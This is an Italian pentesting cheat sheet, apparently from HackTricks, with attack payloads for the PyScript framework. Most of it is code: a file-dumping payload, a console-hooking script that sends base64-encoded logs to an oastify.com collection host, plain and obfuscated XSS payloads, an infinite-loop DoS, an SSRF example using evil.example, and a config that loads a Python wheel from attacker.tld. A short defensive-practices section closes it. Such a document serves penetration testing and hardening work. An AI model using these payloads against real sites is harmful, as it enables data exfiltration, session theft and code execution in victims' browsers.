# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Guida al Pentesting con PyScript

PyScript è un nuovo framework sviluppato per integrare Python in HTML, quindi può essere utilizzato insieme a HTML. In questo cheat sheet, troverai come utilizzare PyScript per i tuoi scopi di penetration testing.

### Dumping / Recupero di file dal filesystem virtuale di Emscripten:

`CVE ID: CVE-2022-30286`\
\
Codice:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration del filesystem di memoria virtuale Emscripten (monitoraggio della console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Codice:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinario)

Codice:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Offuscato)

Codice:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (Offuscamento JavaScript)

Codice:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### Attacco DoS (Ciclo infinito)

Codice:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nuove vulnerabilità e tecniche (2023-2025)

### Server-Side Request Forgery tramite redirect non controllati (CVE-2025-50182)

`urllib3 < 2.5.0` ignora i parametri `redirect` e `retries` quando viene eseguito **all'interno del runtime Pyodide** che viene fornito con PyScript. Quando un attaccante può influenzare gli URL di destinazione, può forzare il codice Python a seguire redirect cross-domain anche quando lo sviluppatore li ha esplicitamente disabilitati ‑ bypassando effettivamente la logica anti-SSRF.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Patched in `urllib3 2.5.0` – aggiorna il pacchetto nella tua immagine PyScript o fissa una versione sicura in `packages = ["urllib3>=2.5.0"]`. Vedi l'entry CVE ufficiale per i dettagli.

### Caricamento di pacchetti arbitrari e attacchi alla supply chain

Poiché PyScript consente URL arbitrari nella lista `packages`, un attore malintenzionato che può modificare o iniettare configurazioni può eseguire **Python completamente arbitrario** nel browser della vittima:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Solo le ruote pure-Python sono necessarie – non è necessario alcun passaggio di compilazione WebAssembly.* Assicurati che la configurazione non sia controllata dall'utente e ospita ruote fidate sul tuo dominio con HTTPS e hash SRI.

### Modifiche alla sanificazione dell'output (2023+)

* `print()` inietta ancora HTML grezzo ed è quindi soggetto a XSS (esempi sopra).
* Il nuovo helper `display()` **escapa l'HTML per impostazione predefinita** – il markup grezzo deve essere racchiuso in `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Questo comportamento è stato introdotto nel 2023 ed è documentato nella guida ufficiale ai Built-ins. Fai affidamento su `display()` per input non attendibili ed evita di chiamare `print()` direttamente.

---

## Pratiche Difensive Migliori

* **Mantieni i pacchetti aggiornati** – aggiorna a `urllib3 >= 2.5.0` e ricostruisci regolarmente i pacchetti che vengono forniti con il sito.
* **Limita le fonti dei pacchetti** – fai riferimento solo ai nomi di PyPI o agli URL della stessa origine, idealmente protetti con Sub-resource Integrity (SRI).
* **Rafforza la Content Security Policy** – vieta JavaScript inline (`script-src 'self' 'sha256-…'`) in modo che i blocchi `<script>` iniettati non possano essere eseguiti.
* **Vieta i tag `<py-script>` / `<script type="py">` forniti dall'utente** – sanitizza l'HTML sul server prima di restituirlo ad altri utenti.
* **Isola i worker** – se non hai bisogno di accesso sincrono al DOM dai worker, abilita il flag `sync_main_only` per evitare i requisiti dell'intestazione `SharedArrayBuffer`.

## Riferimenti

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [Documentazione Built-ins di PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
